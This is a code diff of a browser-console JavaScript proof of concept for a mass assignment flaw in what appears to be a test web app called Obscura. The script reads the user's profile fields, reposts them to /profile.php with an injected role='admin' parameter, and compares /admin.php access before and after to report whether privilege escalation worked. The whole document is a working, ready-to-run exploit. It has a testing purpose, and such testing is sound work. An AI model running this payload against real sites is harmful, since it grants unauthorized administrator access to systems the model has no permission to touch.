@@ -1,36 +1,55 @@
 (async () => {
-  const username = 'testuser';
-  const email = 'test@example.com';
+  console.log("=== OBSCURA MASS ASSIGNMENT PoC ===");
 
-  const response = await fetch('/profile.php', {
-    method: 'POST',
-    credentials: 'same-origin',
+  const profileResponse = await fetch("/profile.php", {
+    credentials: "same-origin"
+  });
+
+  const profileHtml = await profileResponse.text();
+  const doc = new DOMParser().parseFromString(profileHtml, "text/html");
+
+  const username = doc.querySelector('input[name="username"]')?.value;
+  const email = doc.querySelector('input[name="email"]')?.value;
+
+  if (!username || !email) {
+    console.error("Could not read profile. Log in first.");
+    return;
+  }
+
+  const before = await fetch("/admin.php", {
+    credentials: "same-origin",
+    redirect: "manual"
+  });
+
+  console.log("Admin access BEFORE:", before.status);
+
+  const response = await fetch("/profile.php", {
+    method: "POST",
+    credentials: "same-origin",
     headers: {
-      'Content-Type': 'application/x-www-form-urlencoded'
+      "Content-Type": "application/x-www-form-urlencoded"
     },
     body: new URLSearchParams({
-      username: username,
-      email: email,
-      role: 'admin'
+      username,
+      email,
+      role: "admin"
     })
   });
 
-  const html = await response.text();
+  console.log("Profile update HTTP:", response.status);
 
-  console.log('HTTP status:', response.status);
-  console.log(
-    'Profile update accepted:',
-    html.includes('Profile updated successfully.')
-  );
-
-  const check = await fetch('/profile.php', {
-    credentials: 'same-origin'
+  const after = await fetch("/admin.php", {
+    credentials: "same-origin",
+    redirect: "manual"
   });
 
-  const page = await check.text();
+  console.log("Admin access AFTER:", after.status);
 
-  console.log(
-    'Admin role visible:',
-    /Current role:\s*<strong>\s*admin\s*<\/strong>/i.test(page)
-  );
+  if (before.status === 403 && after.status === 200) {
+    console.log("[+] VULNERABLE: User escalated privileges to admin.");
+  } else if (before.status === 403 && after.status === 403) {
+    console.log("[-] PROTECTED: User remains without admin access.");
+  } else {
+    console.log("[?] Inconclusive. Check the user's initial role.");
+  }
 })();
